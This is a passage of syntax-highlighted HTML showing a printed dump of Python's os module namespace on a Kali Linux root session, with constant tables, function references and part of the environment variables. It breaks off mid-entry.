class="string">'EX_OSFILE'</span>: <span class="number">72</span>, <span class="string">'EX_CANTCREAT'</span>: <span class="number">73</span>, <span class="string">'EX_IOERR'</span>: <span class="number">74</span>, <span class="string">'EX_TEMPFAIL'</span>: <span class="number">75</span>, <span class="string">'EX_PROTOCOL'</span>: <span class="number">76</span>, <span class="string">'EX_NOPERM'</span>: <span class="number">77</span>, <span class="string">'EX_CONFIG'</span>: <span class="number">78</span>, <span class="string">'ST_RDONLY'</span>: <span class="number">1</span>, <span class="string">'ST_NOSUID'</span>: <span class="number">2</span>, <span class="string">'ST_NODEV'</span>: <span class="number">4</span>, <span class="string">'ST_NOEXEC'</span>: <span class="number">8</span>, <span class="string">'ST_SYNCHRONOUS'</span>: <span class="number">16</span>, <span class="string">'ST_MANDLOCK'</span>: <span class="number">64</span>, <span class="string">'ST_WRITE'</span>: <span class="number">128</span>, <span class="string">'ST_APPEND'</span>: <span class="number">256</span>, <span class="string">'ST_NOATIME'</span>: <span class="number">1024</span>, <span class="string">'ST_NODIRATIME'</span>: <span class="number">2048</span>, <span class="string">'ST_RELATIME'</span>: <span class="number">4096</span>, <span class="string">'POSIX_FADV_NORMAL'</span>: <span class="number">0</span>, <span class="string">'POSIX_FADV_SEQUENTIAL'</span>: <span class="number">2</span>, <span class="string">'POSIX_FADV_RANDOM'</span>: <span class="number">1</span>, <span class="string">'POSIX_FADV_NOREUSE'</span>: <span class="number">5</span>, <span class="string">'POSIX_FADV_WILLNEED'</span>: <span class="number">3</span>, <span class="string">'POSIX_FADV_DONTNEED'</span>: <span class="number">4</span>, <span class="string">'P_PID'</span>: <span class="number">1</span>, <span class="string">'P_PGID'</span>: <span class="number">2</span>, <span class="string">'P_ALL'</span>: <span class="number">0</span>, <span class="string">'P_PIDFD'</span>: <span class="number">3</span>, <span class="string">'WEXITED'</span>: <span class="number">4</span>, <span class="string">'WNOWAIT'</span>: <span class="number">16777216</span>, <span class="string">'WSTOPPED'</span>: <span class="number">2</span>, <span class="string">'CLD_EXITED'</span>: <span class="number">1</span>, <span class="string">'CLD_KILLED'</span>: <span class="number">2</span>, <span class="string">'CLD_DUMPED'</span>: <span class="number">3</span>, <span class="string">'CLD_TRAPPED'</span>: <span class="number">4</span>, <span class="string">'CLD_STOPPED'</span>: <span class="number">5</span>, <span class="string">'CLD_CONTINUED'</span>: <span class="number">6</span>, <span class="string">'F_LOCK'</span>: <span class="number">1</span>, <span class="string">'F_TLOCK'</span>: <span class="number">2</span>, <span class="string">'F_ULOCK'</span>: <span class="number">0</span>, <span class="string">'F_TEST'</span>: <span class="number">3</span>, <span class="string">'RWF_DSYNC'</span>: <span class="number">2</span>, <span class="string">'RWF_HIPRI'</span>: <span class="number">1</span>, <span class="string">'RWF_SYNC'</span>: <span class="number">4</span>, <span class="string">'RWF_NOWAIT'</span>: <span class="number">8</span>, <span class="string">'POSIX_SPAWN_OPEN'</span>: <span class="number">0</span>, <span class="string">'POSIX_SPAWN_CLOSE'</span>: <span class="number">1</span>, <span class="string">'POSIX_SPAWN_DUP2'</span>: <span class="number">2</span>, <span class="string">'SCHED_OTHER'</span>: <span class="number">0</span>, <span class="string">'SCHED_FIFO'</span>: <span class="number">1</span>, <span class="string">'SCHED_RR'</span>: <span class="number">2</span>, <span class="string">'SCHED_BATCH'</span>: <span class="number">3</span>, <span class="string">'SCHED_IDLE'</span>: <span class="number">5</span>, <span class="string">'SCHED_RESET_ON_FORK'</span>: <span class="number">1073741824</span>, <span class="string">'XATTR_CREATE'</span>: <span class="number">1</span>, <span class="string">'XATTR_REPLACE'</span>: <span class="number">2</span>, <span class="string">'XATTR_SIZE_MAX'</span>: <span class="number">65536</span>, <span class="string">'RTLD_LAZY'</span>: <span class="number">1</span>, <span class="string">'RTLD_NOW'</span>: <span class="number">2</span>, <span class="string">'RTLD_GLOBAL'</span>: <span class="number">256</span>, <span class="string">'RTLD_LOCAL'</span>: <span class="number">0</span>, <span class="string">'RTLD_NODELETE'</span>: <span class="number">4096</span>, <span class="string">'RTLD_NOLOAD'</span>: <span class="number">4</span>, <span class="string">'RTLD_DEEPBIND'</span>: <span class="number">8</span>, <span class="string">'GRND_RANDOM'</span>: <span class="number">2</span>, <span class="string">'GRND_NONBLOCK'</span>: <span class="number">1</span>, <span class="string">'MFD_CLOEXEC'</span>: <span class="number">1</span>, <span class="string">'MFD_ALLOW_SEALING'</span>: <span class="number">2</span>, <span class="string">'MFD_HUGETLB'</span>: <span class="number">4</span>, <span class="string">'MFD_HUGE_SHIFT'</span>: <span class="number">26</span>, <span class="string">'MFD_HUGE_MASK'</span>: <span class="number">63</span>, <span class="string">'MFD_HUGE_64KB'</span>: <span class="number">1073741824</span>, <span class="string">'MFD_HUGE_512KB'</span>: <span class="number">1275068416</span>, <span class="string">'MFD_HUGE_1MB'</span>: <span class="number">1342177280</span>, <span class="string">'MFD_HUGE_2MB'</span>: <span class="number">1409286144</span>, <span class="string">'MFD_HUGE_8MB'</span>: <span class="number">1543503872</span>, <span class="string">'MFD_HUGE_16MB'</span>: <span class="number">1610612736</span>, <span class="string">'MFD_HUGE_32MB'</span>: <span class="number">1677721600</span>, <span class="string">'MFD_HUGE_256MB'</span>: <span class="number">1879048192</span>, <span class="string">'MFD_HUGE_512MB'</span>: <span class="number">1946157056</span>, <span class="string">'MFD_HUGE_1GB'</span>: <span class="number">2013265920</span>, <span class="string">'MFD_HUGE_2GB'</span>: <span class="number">2080374784</span>, <span class="string">'MFD_HUGE_16GB'</span>: -<span class="number">2013265920</span>, <span class="string">'pathconf_names'</span>: {<span class="string">'PC_ALLOC_SIZE_MIN'</span>: <span class="number">18</span>, <span class="string">'PC_ASYNC_IO'</span>: <span class="number">10</span>, <span class="string">'PC_CHOWN_RESTRICTED'</span>: <span class="number">6</span>, <span class="string">'PC_FILESIZEBITS'</span>: <span class="number">13</span>, <span class="string">'PC_LINK_MAX'</span>: <span class="number">0</span>, <span class="string">'PC_MAX_CANON'</span>: <span class="number">1</span>, <span class="string">'PC_MAX_INPUT'</span>: <span class="number">2</span>, <span class="string">'PC_NAME_MAX'</span>: <span class="number">3</span>, <span class="string">'PC_NO_TRUNC'</span>: <span class="number">7</span>, <span class="string">'PC_PATH_MAX'</span>: <span class="number">4</span>, <span class="string">'PC_PIPE_BUF'</span>: <span class="number">5</span>, <span class="string">'PC_PRIO_IO'</span>: <span class="number">11</span>, <span class="string">'PC_REC_INCR_XFER_SIZE'</span>: <span class="number">14</span>, <span class="string">'PC_REC_MAX_XFER_SIZE'</span>: <span class="number">15</span>, <span class="string">'PC_REC_MIN_XFER_SIZE'</span>: <span class="number">16</span>, <span class="string">'PC_REC_XFER_ALIGN'</span>: <span class="number">17</span>, <span class="string">'PC_SOCK_MAXBUF'</span>: <span class="number">12</span>, <span class="string">'PC_SYMLINK_MAX'</span>: <span class="number">19</span>, <span class="string">'PC_SYNC_IO'</span>: <span class="number">9</span>, <span class="string">'PC_VDISABLE'</span>: <span class="number">8</span>}, <span class="string">'confstr_names'</span>: {<span class="string">'CS_GNU_LIBC_VERSION'</span>: <span class="number">2</span>, <span class="string">'CS_GNU_LIBPTHREAD_VERSION'</span>: <span class="number">3</span>, <span class="string">'CS_LFS64_CFLAGS'</span>: <span class="number">1004</span>, <span class="string">'CS_LFS64_LDFLAGS'</span>: <span class="number">1005</span>, <span class="string">'CS_LFS64_LIBS'</span>: <span class="number">1006</span>, <span class="string">'CS_LFS64_LINTFLAGS'</span>: <span class="number">1007</span>, <span class="string">'CS_LFS_CFLAGS'</span>: <span class="number">1000</span>, <span class="string">'CS_LFS_LDFLAGS'</span>: <span class="number">1001</span>, <span class="string">'CS_LFS_LIBS'</span>: <span class="number">1002</span>, <span class="string">'CS_LFS_LINTFLAGS'</span>: <span class="number">1003</span>, <span class="string">'CS_PATH'</span>: <span class="number">0</span>, <span class="string">'CS_XBS5_ILP32_OFF32_CFLAGS'</span>: <span class="number">1100</span>, <span class="string">'CS_XBS5_ILP32_OFF32_LDFLAGS'</span>: <span class="number">1101</span>, <span class="string">'CS_XBS5_ILP32_OFF32_LIBS'</span>: <span class="number">1102</span>, <span class="string">'CS_XBS5_ILP32_OFF32_LINTFLAGS'</span>: <span class="number">1103</span>, <span class="string">'CS_XBS5_ILP32_OFFBIG_CFLAGS'</span>: <span class="number">1104</span>, <span class="string">'CS_XBS5_ILP32_OFFBIG_LDFLAGS'</span>: <span class="number">1105</span>, <span class="string">'CS_XBS5_ILP32_OFFBIG_LIBS'</span>: <span class="number">1106</span>, <span class="string">'CS_XBS5_ILP32_OFFBIG_LINTFLAGS'</span>: <span class="number">1107</span>, <span class="string">'CS_XBS5_LP64_OFF64_CFLAGS'</span>: <span class="number">1108</span>, <span class="string">'CS_XBS5_LP64_OFF64_LDFLAGS'</span>: <span class="number">1109</span>, <span class="string">'CS_XBS5_LP64_OFF64_LIBS'</span>: <span class="number">1110</span>, <span class="string">'CS_XBS5_LP64_OFF64_LINTFLAGS'</span>: <span class="number">1111</span>, <span class="string">'CS_XBS5_LPBIG_OFFBIG_CFLAGS'</span>: <span class="number">1112</span>, <span class="string">'CS_XBS5_LPBIG_OFFBIG_LDFLAGS'</span>: <span class="number">1113</span>, <span class="string">'CS_XBS5_LPBIG_OFFBIG_LIBS'</span>: <span class="number">1114</span>, <span class="string">'CS_XBS5_LPBIG_OFFBIG_LINTFLAGS'</span>: <span class="number">1115</span>}, <span class="string">'sysconf_names'</span>: {<span class="string">'SC_2_CHAR_TERM'</span>: <span class="number">95</span>, <span class="string">'SC_2_C_BIND'</span>: <span class="number">47</span>, <span class="string">'SC_2_C_DEV'</span>: <span class="number">48</span>, <span class="string">'SC_2_C_VERSION'</span>: <span class="number">96</span>, <span class="string">'SC_2_FORT_DEV'</span>: <span class="number">49</span>, <span class="string">'SC_2_FORT_RUN'</span>: <span class="number">50</span>, <span class="string">'SC_2_LOCALEDEF'</span>: <span class="number">52</span>, <span class="string">'SC_2_SW_DEV'</span>: <span class="number">51</span>, <span class="string">'SC_2_UPE'</span>: <span class="number">97</span>, <span class="string">'SC_2_VERSION'</span>: <span class="number">46</span>, <span class="string">'SC_AIO_LISTIO_MAX'</span>: <span class="number">23</span>, <span class="string">'SC_AIO_MAX'</span>: <span class="number">24</span>, <span class="string">'SC_AIO_PRIO_DELTA_MAX'</span>: <span class="number">25</span>, <span class="string">'SC_ARG_MAX'</span>: <span class="number">0</span>, <span class="string">'SC_ASYNCHRONOUS_IO'</span>: <span class="number">12</span>, <span class="string">'SC_ATEXIT_MAX'</span>: <span class="number">87</span>, <span class="string">'SC_AVPHYS_PAGES'</span>: <span class="number">86</span>, <span class="string">'SC_BC_BASE_MAX'</span>: <span class="number">36</span>, <span class="string">'SC_BC_DIM_MAX'</span>: <span class="number">37</span>, <span class="string">'SC_BC_SCALE_MAX'</span>: <span class="number">38</span>, <span class="string">'SC_BC_STRING_MAX'</span>: <span class="number">39</span>, <span class="string">'SC_CHARCLASS_NAME_MAX'</span>: <span class="number">45</span>, <span class="string">'SC_CHAR_BIT'</span>: <span class="number">101</span>, <span class="string">'SC_CHAR_MAX'</span>: <span class="number">102</span>, <span class="string">'SC_CHAR_MIN'</span>: <span class="number">103</span>, <span class="string">'SC_CHILD_MAX'</span>: <span class="number">1</span>, <span class="string">'SC_CLK_TCK'</span>: <span class="number">2</span>, <span class="string">'SC_COLL_WEIGHTS_MAX'</span>: <span class="number">40</span>, <span class="string">'SC_DELAYTIMER_MAX'</span>: <span class="number">26</span>, <span class="string">'SC_EQUIV_CLASS_MAX'</span>: <span class="number">41</span>, <span class="string">'SC_EXPR_NEST_MAX'</span>: <span class="number">42</span>, <span class="string">'SC_FSYNC'</span>: <span class="number">15</span>, <span class="string">'SC_GETGR_R_SIZE_MAX'</span>: <span class="number">69</span>, <span class="string">'SC_GETPW_R_SIZE_MAX'</span>: <span class="number">70</span>, <span class="string">'SC_INT_MAX'</span>: <span class="number">104</span>, <span class="string">'SC_INT_MIN'</span>: <span class="number">105</span>, <span class="string">'SC_IOV_MAX'</span>: <span class="number">60</span>, <span class="string">'SC_JOB_CONTROL'</span>: <span class="number">7</span>, <span class="string">'SC_LINE_MAX'</span>: <span class="number">43</span>, <span class="string">'SC_LOGIN_NAME_MAX'</span>: <span class="number">71</span>, <span class="string">'SC_LONG_BIT'</span>: <span class="number">106</span>, <span class="string">'SC_MAPPED_FILES'</span>: <span class="number">16</span>, <span class="string">'SC_MB_LEN_MAX'</span>: <span class="number">108</span>, <span class="string">'SC_MEMLOCK'</span>: <span class="number">17</span>, <span class="string">'SC_MEMLOCK_RANGE'</span>: <span class="number">18</span>, <span class="string">'SC_MEMORY_PROTECTION'</span>: <span class="number">19</span>, <span class="string">'SC_MESSAGE_PASSING'</span>: <span class="number">20</span>, <span class="string">'SC_MQ_OPEN_MAX'</span>: <span class="number">27</span>, <span class="string">'SC_MQ_PRIO_MAX'</span>: <span class="number">28</span>, <span class="string">'SC_NGROUPS_MAX'</span>: <span class="number">3</span>, <span class="string">'SC_NL_ARGMAX'</span>: <span class="number">119</span>, <span class="string">'SC_NL_LANGMAX'</span>: <span class="number">120</span>, <span class="string">'SC_NL_MSGMAX'</span>: <span class="number">121</span>, <span class="string">'SC_NL_NMAX'</span>: <span class="number">122</span>, <span class="string">'SC_NL_SETMAX'</span>: <span class="number">123</span>, <span class="string">'SC_NL_TEXTMAX'</span>: <span class="number">124</span>, <span class="string">'SC_NPROCESSORS_CONF'</span>: <span class="number">83</span>, <span class="string">'SC_NPROCESSORS_ONLN'</span>: <span class="number">84</span>, <span class="string">'SC_NZERO'</span>: <span class="number">109</span>, <span class="string">'SC_OPEN_MAX'</span>: <span class="number">4</span>, <span class="string">'SC_PAGESIZE'</span>: <span class="number">30</span>, <span class="string">'SC_PAGE_SIZE'</span>: <span class="number">30</span>, <span class="string">'SC_PASS_MAX'</span>: <span class="number">88</span>, <span class="string">'SC_PHYS_PAGES'</span>: <span class="number">85</span>, <span class="string">'SC_PII'</span>: <span class="number">53</span>, <span class="string">'SC_PII_INTERNET'</span>: <span class="number">56</span>, <span class="string">'SC_PII_INTERNET_DGRAM'</span>: <span class="number">62</span>, <span class="string">'SC_PII_INTERNET_STREAM'</span>: <span class="number">61</span>, <span class="string">'SC_PII_OSI'</span>: <span class="number">57</span>, <span class="string">'SC_PII_OSI_CLTS'</span>: <span class="number">64</span>, <span class="string">'SC_PII_OSI_COTS'</span>: <span class="number">63</span>, <span class="string">'SC_PII_OSI_M'</span>: <span class="number">65</span>, <span class="string">'SC_PII_SOCKET'</span>: <span class="number">55</span>, <span class="string">'SC_PII_XTI'</span>: <span class="number">54</span>, <span class="string">'SC_POLL'</span>: <span class="number">58</span>, <span class="string">'SC_PRIORITIZED_IO'</span>: <span class="number">13</span>, <span class="string">'SC_PRIORITY_SCHEDULING'</span>: <span class="number">10</span>, <span class="string">'SC_REALTIME_SIGNALS'</span>: <span class="number">9</span>, <span class="string">'SC_RE_DUP_MAX'</span>: <span class="number">44</span>, <span class="string">'SC_RTSIG_MAX'</span>: <span class="number">31</span>, <span class="string">'SC_SAVED_IDS'</span>: <span class="number">8</span>, <span class="string">'SC_SCHAR_MAX'</span>: <span class="number">111</span>, <span class="string">'SC_SCHAR_MIN'</span>: <span class="number">112</span>, <span class="string">'SC_SELECT'</span>: <span class="number">59</span>, <span class="string">'SC_SEMAPHORES'</span>: <span class="number">21</span>, <span class="string">'SC_SEM_NSEMS_MAX'</span>: <span class="number">32</span>, <span class="string">'SC_SEM_VALUE_MAX'</span>: <span class="number">33</span>, <span class="string">'SC_SHARED_MEMORY_OBJECTS'</span>: <span class="number">22</span>, <span class="string">'SC_SHRT_MAX'</span>: <span class="number">113</span>, <span class="string">'SC_SHRT_MIN'</span>: <span class="number">114</span>, <span class="string">'SC_SIGQUEUE_MAX'</span>: <span class="number">34</span>, <span class="string">'SC_SSIZE_MAX'</span>: <span class="number">110</span>, <span class="string">'SC_STREAM_MAX'</span>: <span class="number">5</span>, <span class="string">'SC_SYNCHRONIZED_IO'</span>: <span class="number">14</span>, <span class="string">'SC_THREADS'</span>: <span class="number">67</span>, <span class="string">'SC_THREAD_ATTR_STACKADDR'</span>: <span class="number">77</span>, <span class="string">'SC_THREAD_ATTR_STACKSIZE'</span>: <span class="number">78</span>, <span class="string">'SC_THREAD_DESTRUCTOR_ITERATIONS'</span>: <span class="number">73</span>, <span class="string">'SC_THREAD_KEYS_MAX'</span>: <span class="number">74</span>, <span class="string">'SC_THREAD_PRIORITY_SCHEDULING'</span>: <span class="number">79</span>, <span class="string">'SC_THREAD_PRIO_INHERIT'</span>: <span class="number">80</span>, <span class="string">'SC_THREAD_PRIO_PROTECT'</span>: <span class="number">81</span>, <span class="string">'SC_THREAD_PROCESS_SHARED'</span>: <span class="number">82</span>, <span class="string">'SC_THREAD_SAFE_FUNCTIONS'</span>: <span class="number">68</span>, <span class="string">'SC_THREAD_STACK_MIN'</span>: <span class="number">75</span>, <span class="string">'SC_THREAD_THREADS_MAX'</span>: <span class="number">76</span>, <span class="string">'SC_TIMERS'</span>: <span class="number">11</span>, <span class="string">'SC_TIMER_MAX'</span>: <span class="number">35</span>, <span class="string">'SC_TTY_NAME_MAX'</span>: <span class="number">72</span>, <span class="string">'SC_TZNAME_MAX'</span>: <span class="number">6</span>, <span class="string">'SC_T_IOV_MAX'</span>: <span class="number">66</span>, <span class="string">'SC_UCHAR_MAX'</span>: <span class="number">115</span>, <span class="string">'SC_UINT_MAX'</span>: <span class="number">116</span>, <span class="string">'SC_UIO_MAXIOV'</span>: <span class="number">60</span>, <span class="string">'SC_ULONG_MAX'</span>: <span class="number">117</span>, <span class="string">'SC_USHRT_MAX'</span>: <span class="number">118</span>, <span class="string">'SC_VERSION'</span>: <span class="number">29</span>, <span class="string">'SC_WORD_BIT'</span>: <span class="number">107</span>, <span class="string">'SC_XBS5_ILP32_OFF32'</span>: <span class="number">125</span>, <span class="string">'SC_XBS5_ILP32_OFFBIG'</span>: <span class="number">126</span>, <span class="string">'SC_XBS5_LP64_OFF64'</span>: <span class="number">127</span>, <span class="string">'SC_XBS5_LPBIG_OFFBIG'</span>: <span class="number">128</span>, <span class="string">'SC_XOPEN_CRYPT'</span>: <span class="number">92</span>, <span class="string">'SC_XOPEN_ENH_I18N'</span>: <span class="number">93</span>, <span class="string">'SC_XOPEN_LEGACY'</span>: <span class="number">129</span>, <span class="string">'SC_XOPEN_REALTIME'</span>: <span class="number">130</span>, <span class="string">'SC_XOPEN_REALTIME_THREADS'</span>: <span class="number">131</span>, <span class="string">'SC_XOPEN_SHM'</span>: <span class="number">94</span>, <span class="string">'SC_XOPEN_UNIX'</span>: <span class="number">91</span>, <span class="string">'SC_XOPEN_VERSION'</span>: <span class="number">89</span>, <span class="string">'SC_XOPEN_XCU_VERSION'</span>: <span class="number">90</span>, <span class="string">'SC_XOPEN_XPG2'</span>: <span class="number">98</span>, <span class="string">'SC_XOPEN_XPG3'</span>: <span class="number">99</span>, <span class="string">'SC_XOPEN_XPG4'</span>: <span class="number">100</span>}, <span class="string">'error'</span>: &lt;<span class="keyword">class</span> <span class="string">'OSError'</span>&gt;, <span class="string">'waitid_result'</span>: &lt;<span class="keyword">class</span> <span class="string">'posix.waitid_result'</span>&gt;, <span class="string">'stat_result'</span>: &lt;<span class="keyword">class</span> <span class="string">'os.stat_result'</span>&gt;, <span class="string">'statvfs_result'</span>: &lt;<span class="keyword">class</span> <span class="string">'os.statvfs_result'</span>&gt;, <span class="string">'sched_param'</span>: &lt;<span class="keyword">class</span> <span class="string">'posix.sched_param'</span>&gt;, <span class="string">'terminal_size'</span>: &lt;<span class="keyword">class</span> <span class="string">'os.terminal_size'</span>&gt;, <span class="string">'DirEntry'</span>: &lt;<span class="keyword">class</span> <span class="string">'posix.DirEntry'</span>&gt;, <span class="string">'times_result'</span>: &lt;<span class="keyword">class</span> <span class="string">'posix.times_result'</span>&gt;, <span class="string">'uname_result'</span>: &lt;<span class="keyword">class</span> <span class="string">'posix.uname_result'</span>&gt;, <span class="string">'_exit'</span>: &lt;built-<span class="keyword">in</span> function _exit&gt;, <span class="string">'path'</span>: &lt;module <span class="string">'posixpath'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python3.9/posixpath.py'</span>&gt;, <span class="string">'curdir'</span>: <span class="string">'.'</span>, <span class="string">'pardir'</span>: <span class="string">'..'</span>, <span class="string">'sep'</span>: <span class="string">'/'</span>, <span class="string">'pathsep'</span>: <span class="string">':'</span>, <span class="string">'defpath'</span>: <span class="string">'/bin:/usr/bin'</span>, <span class="string">'extsep'</span>: <span class="string">'.'</span>, <span class="string">'altsep'</span>: <span class="literal">None</span>, <span class="string">'devnull'</span>: <span class="string">'/dev/null'</span>, <span class="string">'supports_dir_fd'</span>: {&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function mknod&gt;, &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, &lt;built-<span class="keyword">in</span> function link&gt;, &lt;built-<span class="keyword">in</span> function mkfifo&gt;, &lt;built-<span class="keyword">in</span> function readlink&gt;, &lt;built-<span class="keyword">in</span> function unlink&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function mkdir&gt;, &lt;built-<span class="keyword">in</span> function rename&gt;, &lt;built-<span class="keyword">in</span> function chmod&gt;, &lt;built-<span class="keyword">in</span> function rmdir&gt;, &lt;built-<span class="keyword">in</span> function symlink&gt;, &lt;built-<span class="keyword">in</span> function access&gt;}, <span class="string">'supports_effective_ids'</span>: {&lt;built-<span class="keyword">in</span> function access&gt;}, <span class="string">'supports_fd'</span>: {&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function scandir&gt;, &lt;built-<span class="keyword">in</span> function execve&gt;, &lt;built-<span class="keyword">in</span> function statvfs&gt;, &lt;built-<span class="keyword">in</span> function truncate&gt;, &lt;built-<span class="keyword">in</span> function listdir&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function chmod&gt;, &lt;built-<span class="keyword">in</span> function chdir&gt;, &lt;built-<span class="keyword">in</span> function pathconf&gt;}, <span class="string">'supports_follow_symlinks'</span>: {&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function link&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function access&gt;}, <span class="string">'SEEK_SET'</span>: <span class="number">0</span>, <span class="string">'SEEK_CUR'</span>: <span class="number">1</span>, <span class="string">'SEEK_END'</span>: <span class="number">2</span>, <span class="string">'makedirs'</span>: &lt;function makedirs at <span class="number">0x7fc7ef547af0</span>&gt;, <span class="string">'removedirs'</span>: &lt;function removedirs at <span class="number">0x7fc7ef46b280</span>&gt;, <span class="string">'renames'</span>: &lt;function renames at <span class="number">0x7fc7ef46b310</span>&gt;, <span class="string">'walk'</span>: &lt;function walk at <span class="number">0x7fc7ef46b3a0</span>&gt;, <span class="string">'_walk'</span>: &lt;function _walk at <span class="number">0x7fc7ef46b430</span>&gt;, <span class="string">'fwalk'</span>: &lt;function fwalk at <span class="number">0x7fc7ef46b4c0</span>&gt;, <span class="string">'_fwalk'</span>: &lt;function _fwalk at <span class="number">0x7fc7ef46b550</span>&gt;, <span class="string">'execl'</span>: &lt;function execl at <span class="number">0x7fc7ef46b5e0</span>&gt;, <span class="string">'execle'</span>: &lt;function execle at <span class="number">0x7fc7ef46b670</span>&gt;, <span class="string">'execlp'</span>: &lt;function execlp at <span class="number">0x7fc7ef46b700</span>&gt;, <span class="string">'execlpe'</span>: &lt;function execlpe at <span class="number">0x7fc7ef46b790</span>&gt;, <span class="string">'execvp'</span>: &lt;function execvp at <span class="number">0x7fc7ef46b820</span>&gt;, <span class="string">'execvpe'</span>: &lt;function execvpe at <span class="number">0x7fc7ef46b8b0</span>&gt;, <span class="string">'_execvpe'</span>: &lt;function _execvpe at <span class="number">0x7fc7ef46b940</span>&gt;, <span class="string">'get_exec_path'</span>: &lt;function get_exec_path at <span class="number">0x7fc7ef46b9d0</span>&gt;, <span class="string">'MutableMapping'</span>: &lt;<span class="keyword">class</span> <span class="string">'collections.abc.MutableMapping'</span>&gt;, <span class="string">'Mapping'</span>: &lt;<span class="keyword">class</span> <span class="string">'collections.abc.Mapping'</span>&gt;, <span class="string">'_Environ'</span>: &lt;<span class="keyword">class</span> <span class="string">'os._Environ'</span>&gt;, <span class="string">'getenv'</span>: &lt;function getenv at <span class="number">0x7fc7ef46ba60</span>&gt;, <span class="string">'supports_bytes_environ'</span>: <span class="literal">True</span>, <span class="string">'environb'</span>: environ({<span class="string">b'COLORTERM'</span>: <span class="string">b'truecolor'</span>, <span class="string">b'DISPLAY'</span>: <span class="string">b':0.0'</span>, <span class="string">b'LANG'</span>: <span class="string">b'en_US.UTF-8'</span>, <span class="string">b'LANGUAGE'</span>: <span class="string">b''</span>, <span class="string">b'PATH'</span>: <span class="string">b'/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games'</span>, <span class="string">b'TERM'</span>: <span class="string">b'xterm-256color'</span>, <span class="string">b'XAUTHORITY'</span>: <span class="string">b'/home/kali/.Xauthority'</span>, <span class="string">b'LS_COLORS'</span>: <span class="string">b'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36::ow=30;44:'</span>, <span class="string">b'MAIL'</span>: <span class="string">b'/var/mail/root'</span>, <span class="string">b'LOGNAME'</span>: <span class="string">b'root'</span>, <span class="string">b'USER'</span>: <span class="string">b'root'</span>, <span class="string">b'HOME'</span>: <span class="string">b'/root'</span>, <span class="string">b'SHELL'</span>: <span class="string">b'/usr/bin/zsh'</span>, <span class="string">b'SUDO_COMMAND'</span>: <span class="string">b'/usr/bin/su'</span>, <span class="string">b'SUDO_USER'</span>: <span class="string">b'kali'</span>, <span class="string">b'SUDO_UID'</span>: <span class="string">b'1000'</span>, <span class="string">b'SUDO_GID'</span>: <span class="string">b'1000'</span>, <span class="string">b'COMMAND_NOT_FOUND_INSTALL_PROMPT'</span>: <span class="string">b'1'</span>, <span class="string">b'POWERSHELL_UPDATECHECK'</span>: <span class="string">b'Off'</span>, <span class="string">b'POWERSHELL_TELEMETRY_OPTOUT'</span>: <span class="string">b'1'</span>, <span class="string">b'DOTNET_CLI_TELEMETRY_OPTOUT'</span>: <span class="string">b'1'</span>, <span class="string">b'SHLVL'</span>: <span class="string">b'1'</span>, <span class="string">b'PWD'</span>: <span class="string">b'/home/kali/Desktop'</span>, <span class="string">b'OLDPWD'</span>: <span class="string">b'/home/kali'</span>, <span class="string">b'LESS_TERMCAP_mb'</span>: <span class="string">b'\x1b[1;31m'</span>, <span class="string">b'LESS_TERMCAP_md'</span>: <span class="string">b'\x1b[1;36m'</span>, <span class="string">b'LESS_TERMCAP_me'</span>: <span class="string">b'\x1b[0m'</span>, <span class="string">b'LESS_TERMCAP_so'</span>: <span class="string">b'\x1b[01;33m'</span>, <span class="string">b'LESS_TERMCAP_se'</span>: <span class="string">b'\x1b[0m'</span>, <span class="string">b'LESS_TERMCAP_us'</span>: <span class="string">b'\x1b[1;32m'</span>, <span class="string">b'LESS_TERMCAP_ue'</span>: <span 